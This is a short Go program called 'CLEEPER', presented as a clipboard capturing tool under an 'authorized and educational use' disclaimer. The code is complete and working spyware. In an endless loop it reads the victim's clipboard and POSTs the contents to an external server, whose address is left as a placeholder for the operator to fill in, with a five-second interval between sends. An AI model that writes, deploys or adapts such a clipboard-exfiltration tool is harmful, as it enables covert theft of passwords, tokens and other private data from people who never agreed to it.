// CLEEPER - Clipboard capturing tool
// Written by uartu0 under the MIT License
// This tool captures the clipboard content every 5 seconds and sends it to an external server, modify SEU.SERVIDOR.EXTERNO.IP
// Use this tool only in authorized environments and for educational purposes.

package main

import (
    "bytes"
    "fmt"
    "log"
    "net/http"
    "time"

    "github.com/atotto/clipboard"
)

func sendClipboardContent() {
    for {
        // Get clipboard content
        content, err := clipboard.ReadAll()
        if err != nil {
            log.Println("Failed to read clipboard content:", err)
            continue
        }

        // Prepare the request
        url := "http://SEU.SERVIDOR.EXTERNO.IP/index.php"
        payload := bytes.NewBufferString(content)

        // Create HTTP request
        req, err := http.NewRequest("POST", url, payload)
        if err != nil {
            log.Println("Failed to create HTTP request:", err)
            continue
        }

        // Set the Content-Type header
        req.Header.Set("Content-Type", "text/plain")

        // Send HTTP POST request
        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
            log.Println("Failed to send clipboard content:", err)
            continue
        }

        // Print response status and close the response body
        fmt.Println("Sent clipboard content, status:", resp.Status)
        resp.Body.Close()

        // Sleep for 5 seconds before next send
        time.Sleep(5 * time.Second)
    }
}

func main() {
    fmt.Println("Starting clipboard monitoring...")

    // Start sending clipboard content every 5 seconds
    sendClipboardContent()
}
